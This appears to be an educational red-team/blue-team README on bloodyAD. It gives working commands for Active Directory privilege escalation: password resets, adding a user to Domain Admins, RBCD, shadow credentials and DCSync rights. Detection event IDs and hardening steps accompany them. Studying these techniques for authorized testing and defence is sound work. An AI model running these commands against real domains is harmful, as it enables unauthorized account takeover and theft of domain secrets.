> **English** | [Italiano](README.md)

# bloodyAD - AD privilege escalation via LDAP writes

> - **Phase:** Privilege Escalation in the domain - abuse of writable ACLs/rights through direct LDAP writes
> - **Visibility:** Medium - LDAP modifications to domain objects (groups, attributes) traceable with Directory Service auditing (Event ID 5136)
> - **Prerequisites:** domain credentials (or hash/ticket) with a writable right over a target object (GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddMember); LDAP/LDAPS connectivity to the DC
> - **Technique:** `bloodyAD (LDAP write privesc)` | **Typical severity:** `High` | **Finding ID:** to assign in lab

- Objective: convert a writable right (found with [BloodHound](<../../01-enumeration/bloodhound/README.en.md>) or [PowerView](<../../01-enumeration/powerview/README.en.md>)) into effective control of the object, using direct LDAP writes without executing code on the DC.

---

## Executive summary

bloodyAD is a Python framework that performs Active Directory privilege-escalation primitives as **direct LDAP
writes**: it does not require an interactive session on the DC, works from Linux and supports authentication
with password, NTLM hash (pass-the-hash), Kerberos tickets and certificates. It is the operationalization of
ACL/delegation abuse: where BloodHound says "you have GenericAll over X", bloodyAD performs the step (changes
X's password, adds it to a group, sets RBCD or shadow credentials, grants DCSync rights). The result is almost
always an escalation (`High`/`Critical`).

## Execution / commands

### Base syntax and write enumeration

```bash
# authentication: password, or -p ':<NThash>' for pass-the-hash, -k for Kerberos, -c for certificate
export B="bloodyAD --host dc01.lab.local -d lab.local -u lowpriv -p 'Password1'"

$B get writable                              # lists the objects the user can write to (and how)
$B get object "svc_sql" --attr msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Escalation primitives (by right type)

```bash
# ForceChangePassword / GenericAll over a user -> password reset and impersonation
$B set password "svc_sql" 'NewPass123!'

# AddMember / GenericAll over a group -> self-addition to a privileged group
$B add groupMember "Domain Admins" lowpriv

# GenericAll/GenericWrite over a computer -> RBCD (resource-based constrained delegation)
$B add rbcd "dc01$" "attacker_pc$"          # then getST -impersonate administrator (see rbcd/)

# GenericWrite over a user/computer -> shadow credentials (msDS-KeyCredentialLink)
$B add shadowCredentials "svc_sql"          # returns the certificate for PKINIT -> TGT/NT hash

# WriteDACL over the domain -> granting of replication rights (DCSync)
$B add dcsync lowpriv                        # then secretsdump/dcsync to extract the domain secrets

# WriteOwner -> take ownership and subsequent granting of GenericAll
$B set owner "svc_sql" lowpriv
$B add genericAll "svc_sql" lowpriv

# MachineAccountQuota > 0 -> creation of a computer account (useful for RBCD)
$B add computer attacker_pc 'MachinePass123!'
```

Illustrative output (representative):

```
$B get writable
distinguishedName: CN=svc_sql,CN=Users,DC=lab,DC=local
permission: WRITE                          <-- writable right over svc_sql
$B set password "svc_sql" 'NewPass123!'
[+] Password changed successfully!         <-- control of the account obtained
```

## Analysis of results

Each primitive turns a right into control: `set password`/`shadowCredentials` give access to the account; `add
groupMember` gives privileged membership; `add rbcd`/`add dcsync` open the way to impersonation and
[DCSync](<../../05-credential-dumping/dcsync/README.en.md>). The severity is `High`, `Critical` when the chain
ends in DCSync or Domain Admins. The operational advantage is that everything happens over LDAP, with no code on
the DC (less endpoint-side EDR noise).

### Theoretical analysis

bloodyAD shows that in AD authorization is governed by the ACLs on directory objects: a single misconfigured ACE
(GenericAll over a group, WriteDACL over the domain) is enough to reconstruct a path toward Domain Admin. The
defense is not "patch a CVE" but ACL hygiene: remove excessive rights, apply the Tiering model and zero out the
MachineAccountQuota.

## Remediation (blue team)

**Detection.** Directory Service Changes (Event ID 5136) on sensitive attributes (`member`,
`msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-KeyCredentialLink`, `nTSecurityDescriptor`); creation of
computer accounts by non-administrative users (Event ID 4741); anomalous password resets (4724).

**Hardening.** Audit and clean up ACLs (remove unnecessary GenericAll/WriteDACL); `MachineAccountQuota` to 0;
Tiering model; protection of privileged objects (AdminSDHolder); monitoring of `msDS-KeyCredentialLink`.

---

## Real-world scenario: post-exploitation projection

> Applies to the "ACL abuse chain up to DCSync/Domain Admins" outcome (severity High/Critical).

**Red team:** from a low-privilege user with a single writable right, bloodyAD chains the primitives (shadow
credentials, then PKINIT, then control of an account with WriteDACL over the domain, then `add dcsync` and dump of the
entire NTDS). All from Linux, over LDAP, without touching the DC filesystem.

**Blue team:** correlate 5136 on `nTSecurityDescriptor`/`member` with the non-administrative origin; contain by
revoking the added rights and rotating the exposed credentials; eradicate by cleaning up the ACLs. Lesson: in AD
the most underestimated attack surface is object permissions, not exposed services.

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `bloodyAD` | ad privesc (ldap) | cli - active | execution of acl/delegation-abuse primitives via ldap writes |
| `BloodHound` | graph enum | gui - active | identification of the writable path to exploit |
| `impacket` (ntlmrelayx, getst, secretsdump) | exploit suite | cli - active | completes the chains (relay, rbcd, dcsync) |
| `Certipy` | adcs/pkinit | cli - active | uses the shadow credential (pkinit) to obtain a tgt/nt hash |

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| discovery | account discovery: domain account | `T1087.002` | enumeration of the writable objects (`get writable`). |
| persistence/privesc | account manipulation | `T1098` | modification of groups, acls, rbcd and shadow credentials for the escalation. |
| persistence | create account: domain account | `T1136.002` | creation of a computer account (machineaccountquota). |
| credential access | os credential dumping: dcsync | `T1003.006` | granting of replication rights and subsequent dump of the secrets. |

---

## Links to other modules

| source | this technique | effect |
| :--- | :--- | :--- |
| [acl-abuse](<../acl-abuse/README.en.md>) / [bloodhound](<../../01-enumeration/bloodhound/README.en.md>) | bloodyad | concretely performs the writable right that was found |
| bloodyad (`add rbcd`) | [rbcd](<../rbcd/README.en.md>) | sets the attribute for delegation and impersonation |
| bloodyad (`add shadowCredentials`) | [shadow-credentials](<../../05-credential-dumping/shadow-credentials/README.en.md>) | sets the keycredentiallink for pkinit |
| bloodyad (`add dcsync`) | [dcsync](<../../05-credential-dumping/dcsync/README.en.md>) | grants the replication rights for secret extraction |

---

> **Note:** Educational content. The commands are functional and must be executed only in owned labs or with explicit authorization. Illustrative outputs, not from real systems.
